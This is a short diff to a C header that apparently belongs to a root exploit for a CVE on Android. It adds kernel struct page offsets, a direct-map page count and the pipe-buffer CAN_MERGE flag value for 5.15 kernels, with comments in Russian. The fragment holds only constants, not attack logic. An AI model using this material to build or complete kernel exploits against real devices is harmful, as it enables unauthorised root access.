@@ -172,5 +172,17 @@
 
 /* ------------------------------------------- helper path ------------------- */
 #define ROOT_HELPER_PATH                   "/data/local/tmp/cve-2026-43499-root"
+#define STRUCT_PAGE_SIZE                   64
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF      8
+#define STRUCT_SLAB_CACHE_OFF              16
+#define STRUCT_PAGE_TYPE_OFF               48
+
+/* Количество страниц для прямого отображения физической памяти */
+#define DIRECT_MAP_PAGES                   (0x100000000ULL / 4096)
+
+/* ------------------------------------------- pipe buffer flags ------------- 
+ * Флаг PIPE_BUF_FLAG_CAN_MERGE в ядрах 5.15 равен 0x10
+ */
+#define PIPE_BUF_FLAG_CAN_MERGE            0x10
 
 #endif /* TARGET_H */
